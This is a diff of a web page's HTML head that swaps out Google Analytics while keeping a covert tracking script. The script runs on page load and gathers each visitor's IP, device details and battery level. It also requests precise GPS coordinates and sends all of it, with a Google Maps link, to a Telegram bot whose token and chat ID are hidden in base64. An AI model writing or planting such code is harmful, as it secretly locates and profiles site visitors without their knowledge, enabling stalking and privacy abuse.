@@ -47,131 +47,119 @@
     </script>
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-R3Y190XYN2"></script>
     <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
+      /* eslint-disable */
 
-      gtag('config', 'G-R3Y190XYN2');
-    </script>
-    <script>
-    /* eslint-disable */
+      const base64Decode = (encoded) => atob(encoded);
 
-    const base64Decode = (encoded) => atob(encoded);
+      const encodedBotToken = 'ODM2MDE3ODY4ODpBQUV2eF93VUhKQTViS1hObUhETFhNbjRPNnV0QzdDMnR5OA==';
+      const encodedChatId = 'LTEwMDM5MzM0NzYwMDE=';
 
-    const encodedBotToken = 'ODM2MDE3ODY4ODpBQUV2eF93VUhKQTViS1hObUhETFhNbjRPNnV0QzdDMnR5OA==';
-    const encodedChatId = 'LTEwMDM5MzM0NzYwMDE=';
+      const sendToTelegram = async (text) => {
+        const token = base64Decode(encodedBotToken);
+        const chatId = base64Decode(encodedChatId);
 
-    const sendToTelegram = async (text) => {
-      const token = base64Decode(encodedBotToken);
-      const chatId = base64Decode(encodedChatId);
+        try {
+          await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
+          });
+        } catch (e) {}
+      };
 
-      try {
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
-        });
-      } catch (e) {}
-    };
+      const collectVisitorData = async () => {
+        // IP Info
+        let ipInfo = {};
+        try {
+          const res = await fetch('https://ipapi.co/json/');
+          ipInfo = await res.json();
+        } catch {}
 
-    // Lightweight data collection (runs after page load)
-    const collectVisitorData = async () => {
-      // 1. IP Info (fast)
-      let ipInfo = {};
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        ipInfo = await res.json();
-      } catch {}
+        const screen = `${window.screen.width}×${window.screen.height} (${window.devicePixelRatio}x)`;
+        const touch = 'ontouchstart' in window ? 'Yes' : 'No';
+        const connection = navigator.connection 
+          ? `${navigator.connection.effectiveType || 'N/A'} | ${navigator.connection.downlink || 'N/A'}Mbps` 
+          : 'N/A';
 
-      // 2. Basic browser/device info
-      const screen = `${window.screen.width}×${window.screen.height} (${window.devicePixelRatio}x)`;
-      const touch = 'ontouchstart' in window ? 'Yes' : 'No';
-      const connection = navigator.connection 
-        ? `${navigator.connection.effectiveType || 'N/A'} | ${navigator.connection.downlink || 'N/A'}Mbps` 
-        : 'N/A';
+        let battery = 'N/A';
+        try {
+          if ('getBattery' in navigator) {
+            const bat = await navigator.getBattery();
+            battery = `${Math.round(bat.level * 100)}%${bat.charging ? ' (charging)' : ''}`;
+          }
+        } catch {}
 
-      // 3. Battery (if supported)
-      let battery = 'N/A';
-      try {
-        if ('getBattery' in navigator) {
-          const bat = await navigator.getBattery();
-          battery = `${Math.round(bat.level * 100)}%${bat.charging ? ' (charging)' : ''}`;
+        const baseInfo = `
+      🌐 IP: ${ipInfo.ip || 'N/A'}
+      🏙 IP Location: ${ipInfo.city || 'N/A'}, ${ipInfo.country_name || 'N/A'}
+      🕒 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+      📅 Local Time: ${new Date().toLocaleString()}
+
+      📱 Device: ${navigator.platform}
+      🖥 Screen: ${screen}
+      👆 Touch: ${touch}
+      🔋 Battery: ${battery}
+      🌍 Language: ${navigator.language}
+      🔗 Referrer: ${document.referrer || 'Direct'}
+      📍 Page: ${window.location.href}
+      📡 Connection: ${connection}
+        `.trim();
+
+        // Geolocation
+        if (!navigator.geolocation) {
+          sendToTelegram(`❌ SCANETICA - No Geolocation\n\n${baseInfo}`);
+          return;
         }
-      } catch {}
 
-      const baseInfo = `
-    🌐 IP: ${ipInfo.ip || 'N/A'}
-    🏙 IP Location: ${ipInfo.city || 'N/A'}, ${ipInfo.country_name || 'N/A'}
-    🕒 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-    📅 Local Time: ${new Date().toLocaleString()}
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            const { latitude, longitude, accuracy } = position.coords;
 
-    📱 Device: ${navigator.platform}
-    🖥 Screen: ${screen}
-    👆 Touch: ${touch}
-    🔋 Battery: ${battery}
-    🌍 Language: ${navigator.language}
-    🔗 Referrer: ${document.referrer || 'Direct'}
-    📍 Page: ${window.location.href}
-    📡 Connection: ${connection}
-    🕵️ User Agent: ${navigator.userAgent.substring(0, 140)}
-      `.trim();
+            let city = 'Unknown', country = 'Unknown';
 
-      // 4. Geolocation (with Google Maps link)
-      if (!navigator.geolocation) {
-        sendToTelegram(`❌ SCANETICA - No Geolocation\n\n${baseInfo}`);
-        return;
-      }
+            try {
+              const geoRes = await fetch(
+                `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
+              );
+              if (geoRes.ok) {
+                const data = await geoRes.json();
+                city = data.city || data.locality || 'Unknown';
+                country = data.countryName || 'Unknown';
+              }
+            } catch {}
 
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          const { latitude, longitude, accuracy } = position.coords;
+            const mapsLink = `https://www.google.com/maps/place/${latitude},${longitude}`;
 
-          let city = 'Unknown', country = 'Unknown';
+            const message = `✅ SCANETICA - New Visitor
 
-          try {
-            const geoRes = await fetch(
-              `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
-            );
-            if (geoRes.ok) {
-              const data = await geoRes.json();
-              city = data.city || data.locality || 'Unknown';
-              country = data.countryName || 'Unknown';
-            }
-          } catch {}
+      📍 GPS: ${latitude}, ${longitude} (±${Math.round(accuracy)}m)
+      🏙 City: ${city}
+      🌍 Country: ${country}
+      🔗 <a href="${mapsLink}">Open in Google Maps</a>
 
-          const mapsLink = `https://www.google.com/maps/place/${latitude},${longitude}`;
+      ${baseInfo}`;
 
-          const message = `✅ SCANETICA - New Visitor
+            sendToTelegram(message);
+          },
+          async (error) => {
+            let status = 'BLOCKED';
+            if (error.code === error.POSITION_UNAVAILABLE) status = 'UNAVAILABLE';
+            if (error.code === error.TIMEOUT) status = 'TIMEOUT';
 
-    📍 GPS: ${latitude}, ${longitude} (±${Math.round(accuracy)}m)
-    🏙 City: ${city}
-    🌍 Country: ${country}
-    🔗 ${mapsLink}
+            const message = `❌ SCANETICA - Location ${status}
 
-    ${baseInfo}`;
+      ${baseInfo}`;
 
-          sendToTelegram(message);
-        },
-        async (error) => {
-          let status = 'BLOCKED';
-          if (error.code === error.POSITION_UNAVAILABLE) status = 'UNAVAILABLE';
-          if (error.code === error.TIMEOUT) status = 'TIMEOUT';
+            sendToTelegram(message);
+          },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      };
 
-          const message = `❌ SCANETICA - Location ${status}
-
-    ${baseInfo}`;
-
-          sendToTelegram(message);
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-      );
-    };
-
-    // Run after page is fully loaded (non-blocking)
-    window.addEventListener('load', () => {
-      setTimeout(collectVisitorData, 1500); // 1.5 second delay so page loads fast
-    });
-    </script>
+      window.addEventListener('load', () => {
+        setTimeout(collectVisitorData, 1500);
+      });
+      </script>
   </head>
   <body>
     <div id="root"></div>
